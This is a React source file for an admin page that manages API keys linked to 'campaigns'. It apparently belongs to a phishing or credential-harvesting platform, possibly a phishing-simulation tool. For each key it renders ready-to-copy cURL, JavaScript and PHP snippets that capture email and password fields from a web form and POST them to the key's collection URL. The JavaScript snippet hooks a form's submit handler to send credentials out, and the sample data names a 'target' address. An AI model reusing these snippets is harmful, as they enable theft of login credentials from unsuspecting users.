import React, { useState, useEffect, useCallback } from 'react';
import api from '../../services/api';
import toast from 'react-hot-toast';
import usePolling from '../../hooks/usePolling';
import StepWizard from '../../components/wizard/StepWizard';
import { HiOutlinePlus, HiOutlineTrash, HiOutlineClipboardDocument, HiOutlineKey, HiOutlineLink, HiOutlineCodeBracket, HiOutlineArrowRight, HiOutlineArrowLeft } from 'react-icons/hi2';
import { useTranslation } from 'react-i18next';

export default function ApiKeys() {
  const { t } = useTranslation();

  const WIZARD_STEPS = [
    { label: t('admin_dashboard.apikeys.step1_title') },
    { label: t('admin_dashboard.apikeys.step2_title') },
  ];
  const [apiKeys, setApiKeys] = useState([]);
  const [campaigns, setCampaigns] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showForm, setShowForm] = useState(false);
  const [showExample, setShowExample] = useState(null); // API key id to show example for
  const [form, setForm] = useState({ name: '', campaign_id: '' });
  const [step, setStep] = useState(0);

  const loadData = useCallback(async () => {
    try {
      const [keysRes, campRes] = await Promise.all([
        api.get('/api-keys'),
        api.get('/campaigns'),
      ]);
      setApiKeys(keysRes.data);
      setCampaigns(campRes.data);
    } catch (err) {
      if (loading) toast.error(t('admin_dashboard.apikeys.messages.load_failed'));
    } finally {
      setLoading(false);
    }
  }, [loading]);

  useEffect(() => { loadData(); }, []);

  // Real-time polling every 5 seconds
  usePolling(loadData, 5000);

  const handleCreate = async (e) => {
    e.preventDefault();
    try {
      await api.post('/api-keys', form);
      toast.success(t('admin_dashboard.apikeys.messages.create_success'));
      setShowForm(false);
      setForm({ name: '', campaign_id: '' });
      setStep(0);
      loadData();
    } catch (err) {
      toast.error(err.response?.data?.detail || t('admin_dashboard.apikeys.messages.create_failed'));
    }
  };

  const handleToggle = async (id) => {
    try {
      await api.patch(`/api-keys/${id}/toggle`);
      toast.success(t('admin_dashboard.apikeys.messages.toggle_success'));
      loadData();
    } catch (err) {
      toast.error(t('admin_dashboard.apikeys.messages.toggle_failed'));
    }
  };

  const handleDelete = async (id, name) => {
    if (!confirm(t('admin_dashboard.apikeys.messages.delete_confirm').replace('{{name}}', name))) return;
    try {
      await api.delete(`/api-keys/${id}`);
      toast.success(t('admin_dashboard.apikeys.messages.delete_success'));
      loadData();
    } catch (err) {
      toast.error(t('admin_dashboard.apikeys.messages.delete_failed'));
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success(t('admin_dashboard.apikeys.messages.copied'));
  };

  const maskKey = (key) => {
    return key.substring(0, 8) + '••••••••' + key.substring(key.length - 8);
  };

  const openNewForm = () => {
    setForm({ name: '', campaign_id: '' });
    setStep(0);
    setShowForm(!showForm);
  };

  if (loading) return <div className="loading-center"><div className="spinner"></div></div>;

  return (
    <div className="fade-in">
      <div className="page-header">
        <div>
          <h1>{t('admin_dashboard.apikeys.title')}</h1>
          <p>{t('admin_dashboard.apikeys.desc')}</p>
        </div>
        <button className="btn btn-primary" onClick={openNewForm}>
          <HiOutlinePlus size={18} /> {t('admin_dashboard.apikeys.btn_create')}
        </button>
      </div>

      {/* Info Banner */}
      <div className="card" style={{ 
        marginBottom: 'var(--space-2xl)', 
        background: 'linear-gradient(135deg, rgba(0, 240, 255, 0.06), rgba(180, 0, 255, 0.06))',
        border: '1px solid rgba(0, 240, 255, 0.15)'
      }}>
        <div style={{ display: 'flex', alignItems: 'flex-start', gap: 'var(--space-lg)' }}>
          <HiOutlineLink size={28} style={{ color: 'var(--accent-primary)', flexShrink: 0, marginTop: '2px' }} />
          <div>
            <h3 style={{ marginBottom: 'var(--space-sm)', color: 'var(--text-primary)' }}>{t('admin_dashboard.apikeys.banner_title')}</h3>
            <p style={{ color: 'var(--text-secondary)', lineHeight: 1.7, margin: 0 }} dangerouslySetInnerHTML={{ __html: t('admin_dashboard.apikeys.banner_desc') }} />
          </div>
        </div>
      </div>

      {/* Create Form */}
      {showForm && (
        <div className="card-glow" style={{ marginBottom: 'var(--space-2xl)' }}>
          <h3 style={{ marginBottom: 'var(--space-lg)', borderBottom: '1px solid var(--divider)', paddingBottom: 'var(--space-sm)' }}>
            {t('admin_dashboard.apikeys.form_title')}
          </h3>

          <StepWizard steps={WIZARD_STEPS} currentStep={step} onStepClick={(i) => { if (i <= step) setStep(i); }} />

          <form onSubmit={handleCreate}>
            {/* ===== STEP 1: Nama / Label ===== */}
            {step === 0 && (
              <div className="wizard-content" key="step-0">
                <div className="wizard-step-header">
                  <h3>{t('admin_dashboard.apikeys.step1_header')}</h3>
                  <p>{t('admin_dashboard.apikeys.step1_desc')}</p>
                </div>
                <div className="input-group">
                  <label>{t('admin_dashboard.apikeys.label_name')}</label>
                  <input 
                    className="input" 
                    placeholder={t('admin_dashboard.apikeys.name_placeholder')} 
                    value={form.name} 
                    onChange={e => setForm({ ...form, name: e.target.value })} 
                    required 
                  />
                </div>
                <div className="wizard-nav">
                  <div className="wizard-nav-left">
                    <button type="button" className="btn btn-secondary" onClick={() => setShowForm(false)}>{t('admin_dashboard.campaigns.form.btn_cancel')}</button>
                  </div>
                  <div className="wizard-nav-right">
                    <button type="button" className="btn btn-primary" disabled={!form.name.trim()} onClick={() => setStep(1)}>
                      {t('admin_dashboard.campaigns.form.btn_next')} <HiOutlineArrowRight size={16} />
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* ===== STEP 2: Kampanye Terkait ===== */}
            {step === 1 && (
              <div className="wizard-content" key="step-1">
                <div className="wizard-step-header">
                  <h3>{t('admin_dashboard.apikeys.step2_header')}</h3>
                  <p>{t('admin_dashboard.apikeys.step2_desc')}</p>
                </div>
                <div className="input-group">
                  <label>{t('admin_dashboard.apikeys.label_campaign')}</label>
                  <select 
                    className="input" 
                    value={form.campaign_id} 
                    onChange={e => setForm({ ...form, campaign_id: e.target.value })} 
                    required
                  >
                    <option value="">{t('admin_dashboard.apikeys.select_campaign')}</option>
                    {campaigns.map(c => (
                      <option key={c.id} value={c.id}>{c.name} ({c.status})</option>
                    ))}
                  </select>
                </div>
                <div className="wizard-nav">
                  <div className="wizard-nav-left">
                    <button type="button" className="btn btn-secondary" onClick={() => setStep(0)}>
                      <HiOutlineArrowLeft size={16} /> {t('admin_dashboard.campaigns.form.btn_back')}
                    </button>
                  </div>
                  <div className="wizard-nav-right">
                    <button type="submit" className="btn btn-primary" disabled={!form.campaign_id}>{t('admin_dashboard.apikeys.btn_submit')}</button>
                  </div>
                </div>
              </div>
            )}
          </form>
        </div>
      )}

      {/* API Keys Table */}
      <div className="table-container">
        <table>
          <thead>
            <tr>
              <th>{t('admin_dashboard.apikeys.col_name')}</th>
              <th>{t('admin_dashboard.apikeys.col_campaign')}</th>
              <th>{t('admin_dashboard.apikeys.col_apikey')}</th>
              <th>{t('admin_dashboard.apikeys.col_status')}</th>
              <th>{t('admin_dashboard.apikeys.col_last_used')}</th>
              <th>{t('admin_dashboard.apikeys.col_actions')}</th>
            </tr>
          </thead>
          <tbody>
            {apiKeys.length === 0 ? (
              <tr><td colSpan="6" style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>{t('admin_dashboard.apikeys.empty_table')}</td></tr>
            ) : apiKeys.map(ak => (
              <React.Fragment key={ak.id}>
                <tr>
                  <td>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <HiOutlineKey size={16} style={{ color: ak.is_active ? 'var(--accent-primary)' : 'var(--text-muted)' }} />
                      <strong>{ak.name}</strong>
                    </div>
                  </td>
                  <td>{ak.campaign_name || '-'}</td>
                  <td>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <code style={{ 
                        fontSize: '0.8rem', 
                        background: 'rgba(0,240,255,0.06)', 
                        padding: '4px 8px', 
                        borderRadius: '4px',
                        fontFamily: 'monospace',
                        color: 'var(--text-secondary)',
                        whiteSpace: 'nowrap'
                      }}>
                        {maskKey(ak.key)}
                      </code>
                      <button 
                        className="btn btn-sm btn-ghost" 
                        onClick={() => copyToClipboard(ak.key)} 
                        title={t('admin_dashboard.apikeys.copy_key')}
                      >
                        <HiOutlineClipboardDocument size={14} />
                      </button>
                    </div>
                  </td>
                  <td>
                    <button 
                      className={`badge ${ak.is_active ? 'badge-success' : 'badge-default'}`}
                      onClick={() => handleToggle(ak.id)}
                      style={{ cursor: 'pointer', border: 'none' }}
                      title="Klik untuk toggle"
                    >
                      {ak.is_active ? t('admin_dashboard.apikeys.status_active') : t('admin_dashboard.apikeys.status_inactive')}
                    </button>
                  </td>
                  <td style={{ color: 'var(--text-secondary)' }}>
                    {ak.last_used_at ? new Date(ak.last_used_at).toLocaleString() : t('admin_dashboard.apikeys.never_used')}
                  </td>
                  <td>
                    <div style={{ display: 'flex', gap: '6px', alignItems: 'center' }}>
                      <button 
                        className="btn btn-sm btn-secondary" 
                        onClick={() => setShowExample(showExample === ak.id ? null : ak.id)}
                        title={t('admin_dashboard.apikeys.btn_example')}
                      >
                        <HiOutlineCodeBracket size={14} /> {t('admin_dashboard.apikeys.btn_example')}
                      </button>
                      <button 
                        className="btn btn-sm btn-ghost" 
                        onClick={() => copyToClipboard(ak.receive_url)} 
                        title={t('admin_dashboard.apikeys.copy_url')}
                      >
                        <HiOutlineLink size={14} />
                      </button>
                      <button 
                        className="btn btn-sm btn-ghost" 
                        onClick={() => handleDelete(ak.id, ak.name)} 
                        title={t('admin_dashboard.apikeys.btn_delete')}
                        style={{ color: 'var(--danger)' }}
                      >
                        <HiOutlineTrash size={14} />
                      </button>
                    </div>
                  </td>
                </tr>
                {showExample === ak.id && (
                  <tr key={`${ak.id}-example`}>
                    <td colSpan="6" style={{ padding: 0 }}>
                      <div style={{ 
                        padding: 'var(--space-lg) var(--space-xl)',
                        background: 'rgba(0, 0, 0, 0.3)',
                        borderTop: '1px solid var(--divider)',
                      }}>
                        <h4 style={{ color: 'var(--accent-primary)', marginBottom: 'var(--space-md)', display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <HiOutlineCodeBracket size={18} /> {t('admin_dashboard.apikeys.example_title')}
                        </h4>

                        {/* Endpoint URL */}
                        <div style={{ marginBottom: 'var(--space-lg)' }}>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>{t('admin_dashboard.apikeys.endpoint_url')}</label>
                          <div style={{ 
                            display: 'flex', alignItems: 'center', gap: '8px',
                            background: 'rgba(0, 240, 255, 0.06)',
                            padding: '10px 14px',
                            borderRadius: '6px',
                            border: '1px solid rgba(0, 240, 255, 0.1)',
                          }}>
                            <code style={{ flex: 1, fontFamily: 'monospace', fontSize: '0.85rem', color: 'var(--accent-primary)', wordBreak: 'break-all' }}>
                              {ak.receive_url}
                            </code>
                            <button className="btn btn-sm btn-ghost" onClick={() => copyToClipboard(ak.receive_url)}>
                              <HiOutlineClipboardDocument size={14} />
                            </button>
                          </div>
                        </div>

                        {/* cURL Example */}
                        <div style={{ marginBottom: 'var(--space-lg)' }}>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>{t('admin_dashboard.apikeys.curl_label')}</label>
                          <pre style={{ 
                            background: 'rgba(0, 0, 0, 0.5)', 
                            padding: '14px', 
                            borderRadius: '6px', 
                            overflow: 'auto',
                            fontSize: '0.82rem',
                            lineHeight: 1.6,
                            color: '#a5f3a6',
                            border: '1px solid rgba(255,255,255,0.06)',
                            margin: 0,
                          }}>
{`curl -X POST "${ak.receive_url}" \\
  -H "Content-Type: application/json" \\
  -d '{"email": "target@company.com", "password": "rahasia123"}'`}
                          </pre>
                          <button className="btn btn-sm btn-ghost" style={{ marginTop: '6px' }} onClick={() => copyToClipboard(`curl -X POST "${ak.receive_url}" -H "Content-Type: application/json" -d '{"email": "target@company.com", "password": "rahasia123"}'`)}>
                            <HiOutlineClipboardDocument size={14} /> {t('admin_dashboard.apikeys.copy_curl')}
                          </button>
                        </div>

                        {/* JavaScript Example */}
                        <div style={{ marginBottom: 'var(--space-lg)' }}>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>{t('admin_dashboard.apikeys.js_label')}</label>
                          <pre style={{ 
                            background: 'rgba(0, 0, 0, 0.5)', 
                            padding: '14px', 
                            borderRadius: '6px', 
                            overflow: 'auto',
                            fontSize: '0.82rem',
                            lineHeight: 1.6,
                            color: '#93c5fd',
                            border: '1px solid rgba(255,255,255,0.06)',
                            margin: 0,
                          }}>
{`${t('admin_dashboard.apikeys.js_comment')}
document.querySelector('form').addEventListener('submit', (e) => {
  e.preventDefault();
  const data = {
    email: document.querySelector('[name="email"]').value,
    password: document.querySelector('[name="password"]').value,
  };
  fetch("${ak.receive_url}", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
});`}
                          </pre>
                          <button className="btn btn-sm btn-ghost" style={{ marginTop: '6px' }} onClick={() => copyToClipboard(`document.querySelector('form').addEventListener('submit', (e) => {\n  e.preventDefault();\n  const data = {\n    email: document.querySelector('[name="email"]').value,\n    password: document.querySelector('[name="password"]').value,\n  };\n  fetch("${ak.receive_url}", {\n    method: "POST",\n    headers: { "Content-Type": "application/json" },\n    body: JSON.stringify(data),\n  });\n});`)}>
                            <HiOutlineClipboardDocument size={14} /> {t('admin_dashboard.apikeys.copy_js')}
                          </button>
                        </div>

                        {/* PHP Example */}
                        <div>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>{t('admin_dashboard.apikeys.php_label')}</label>
                          <pre style={{ 
                            background: 'rgba(0, 0, 0, 0.5)', 
                            padding: '14px', 
                            borderRadius: '6px', 
                            overflow: 'auto',
                            fontSize: '0.82rem',
                            lineHeight: 1.6,
                            color: '#c4b5fd',
                            border: '1px solid rgba(255,255,255,0.06)',
                            margin: 0,
                          }}>
{`<?php
$data = json_encode([
    'email'    => $_POST['email'],
    'password' => $_POST['password'],
]);

$ch = curl_init("${ak.receive_url}");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
?>`}
                          </pre>
                        </div>
                      </div>
                    </td>
                  </tr>
                )}
              </React.Fragment>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
